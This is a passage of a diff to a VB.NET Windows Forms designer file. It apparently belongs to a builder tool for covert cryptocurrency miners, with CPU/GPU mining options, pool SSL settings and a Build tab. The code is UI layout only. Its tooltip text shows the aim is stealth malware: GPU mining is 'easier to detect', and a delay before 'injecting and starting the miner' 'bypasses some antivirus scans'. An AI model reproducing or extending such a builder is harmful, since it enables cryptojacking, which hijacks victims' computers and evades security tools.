         Me.txtAdvParam.UseSystemPasswordChar = False
         Me.txtAdvParam.WordWrap = False
         '
+        'Label17
+        '
+        Me.Label17.AutoSize = True
+        Me.Label17.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label17.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label17.ForeColor = System.Drawing.Color.Teal
+        Me.Label17.Location = New System.Drawing.Point(175, 95)
+        Me.Label17.Name = "Label17"
+        Me.Label17.Size = New System.Drawing.Size(13, 13)
+        Me.Label17.TabIndex = 43
+        Me.Label17.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.Label17, "SSL/TLS increases performance and stability but only works on some pools, check t" &
+        "he pool you're using the see if it supports it. Most pools use a different port " &
+        "for SSL/TLS.")
+        '
         'Label18
         '
         Me.Label18.AutoSize = True
@@ -1226,6 +1158,73 @@ Partial Class Form1
         Me.toggleSSLTLS.Size = New System.Drawing.Size(50, 24)
         Me.toggleSSLTLS.TabIndex = 41
         Me.toggleSSLTLS.Text = "Enable SSL/TLS Connection"
+        '
+        'Label16
+        '
+        Me.Label16.AutoSize = True
+        Me.Label16.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label16.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label16.ForeColor = System.Drawing.Color.Teal
+        Me.Label16.Location = New System.Drawing.Point(176, 123)
+        Me.Label16.Name = "Label16"
+        Me.Label16.Size = New System.Drawing.Size(13, 13)
+        Me.Label16.TabIndex = 40
+        Me.Label16.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.Label16, "Only enable if mining to nicehash.com or using something like xmrig-proxy where t" &
+        "he jobs needs to be split into multiple sub jobs.")
+        '
+        'Label15
+        '
+        Me.Label15.AutoSize = True
+        Me.Label15.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label15.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label15.ForeColor = System.Drawing.Color.Teal
+        Me.Label15.Location = New System.Drawing.Point(175, 68)
+        Me.Label15.Name = "Label15"
+        Me.Label15.Size = New System.Drawing.Size(13, 13)
+        Me.Label15.TabIndex = 39
+        Me.Label15.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.Label15, resources.GetString("Label15.ToolTip"))
+        '
+        'Label14
+        '
+        Me.Label14.AutoSize = True
+        Me.Label14.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label14.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label14.ForeColor = System.Drawing.Color.Teal
+        Me.Label14.Location = New System.Drawing.Point(175, 41)
+        Me.Label14.Name = "Label14"
+        Me.Label14.Size = New System.Drawing.Size(13, 13)
+        Me.Label14.TabIndex = 38
+        Me.Label14.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.Label14, "GPU Mining gives better performance but is easier to detect and greatly increases" &
+        " the miner file size.")
+        '
+        'helpLabelEnableCPU
+        '
+        Me.helpLabelEnableCPU.AutoSize = True
+        Me.helpLabelEnableCPU.Cursor = System.Windows.Forms.Cursors.Help
+        Me.helpLabelEnableCPU.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.helpLabelEnableCPU.ForeColor = System.Drawing.Color.Teal
+        Me.helpLabelEnableCPU.Location = New System.Drawing.Point(175, 14)
+        Me.helpLabelEnableCPU.Name = "helpLabelEnableCPU"
+        Me.helpLabelEnableCPU.Size = New System.Drawing.Size(13, 13)
+        Me.helpLabelEnableCPU.TabIndex = 37
+        Me.helpLabelEnableCPU.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.helpLabelEnableCPU, "Enables mining on the CPU.")
+        '
+        'helpLabelMaxCPU
+        '
+        Me.helpLabelMaxCPU.AutoSize = True
+        Me.helpLabelMaxCPU.Cursor = System.Windows.Forms.Cursors.Help
+        Me.helpLabelMaxCPU.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.helpLabelMaxCPU.ForeColor = System.Drawing.Color.Teal
+        Me.helpLabelMaxCPU.Location = New System.Drawing.Point(393, 14)
+        Me.helpLabelMaxCPU.Name = "helpLabelMaxCPU"
+        Me.helpLabelMaxCPU.Size = New System.Drawing.Size(13, 13)
+        Me.helpLabelMaxCPU.TabIndex = 36
+        Me.helpLabelMaxCPU.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.helpLabelMaxCPU, "The max amount of CPU the miner should use.")
         '
         'Label13
         '
@@ -1363,6 +1362,20 @@ Partial Class Form1
         Me.TabPage5.TabIndex = 4
         Me.TabPage5.Text = "Build"
         '
+        'Label28
+        '
+        Me.Label28.AutoSize = True
+        Me.Label28.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label28.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label28.ForeColor = System.Drawing.Color.Teal
+        Me.Label28.Location = New System.Drawing.Point(178, 13)
+        Me.Label28.Name = "Label28"
+        Me.Label28.Size = New System.Drawing.Size(13, 13)
+        Me.Label28.TabIndex = 58
+        Me.Label28.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.Label28, "The time to wait before injecting and starting the miner. This bypasses some anti" &
+        "virus scans!")
+        '
         'Label29
         '
         Me.Label29.AutoSize = True
@@ -1452,19 +1465,6 @@ Partial Class Form1
         Me.btnBuild.Size = New System.Drawing.Size(99, 25)
         Me.btnBuild.TabIndex = 17
         Me.btnBuild.Text = "Build"
-        '
-        'Label40
-        '
-        Me.Label40.AutoSize = True
-        Me.Label40.Cursor = System.Windows.Forms.Cursors.Help
-        Me.Label40.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.Label40.ForeColor = System.Drawing.Color.Teal
-        Me.Label40.Location = New System.Drawing.Point(194, 153)
-        Me.Label40.Name = "Label40"
-        Me.Label40.Size = New System.Drawing.Size(13, 13)
-        Me.Label40.TabIndex = 47
-        Me.Label40.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label40, "Enable if you want the program to be removed after a date")
         '
         'Form1
         '
